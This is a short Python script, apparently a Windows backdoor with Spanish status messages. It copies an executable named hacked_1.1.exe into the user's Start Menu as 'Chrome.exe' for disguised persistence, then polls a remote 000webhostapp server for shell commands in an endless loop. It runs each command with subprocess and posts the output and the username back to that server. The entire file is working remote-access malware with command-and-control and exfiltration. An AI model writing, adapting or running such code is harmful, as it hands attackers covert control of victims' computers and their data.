import requests
from requests.api import post
import os
import time
import getpass
import subprocess
print("INICIANDO")
user = getpass.getuser()

dire = f'/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Chrome.exe'
di = f'copy hacked_1.1.exe "{dire}"'
print(di)
os.system(di)

urlp = "https://marksukember12.000webhostapp.com"

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (K HTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'}
ip = requests.post(f"{urlp}", headers=headers).text
#print(ip)
time.sleep(2)


while True:
    comand  = requests.post(f"{urlp}/comand.txt", headers=headers).text

    
    if comand == "":
        comand  = requests.post(f"{urlp}/{ip}.txt", headers=headers).text
        if comand == "":
            time.sleep(10)
            print("no hay comandos user")
        else:
            rep = subprocess.check_output(comand, shell=True)
            requests.post(f"{urlp}/index.php", data={"data": rep, "userr": user}, headers=headers)
            print(rep)          
            print("Enviando comandos user")
            time.sleep(10)
    else:
        if comand == "":
            time.sleep(10)
            print("no hay comandos principal")
        else:
            rep = subprocess.check_output(comand, shell=True)
            sub = requests.post(f"{urlp}/index.php", data={"data": rep, "admin": "listo"}, headers=headers)
            print(sub.text)          
            print("Enviando comandos principal")
            time.sleep(10)
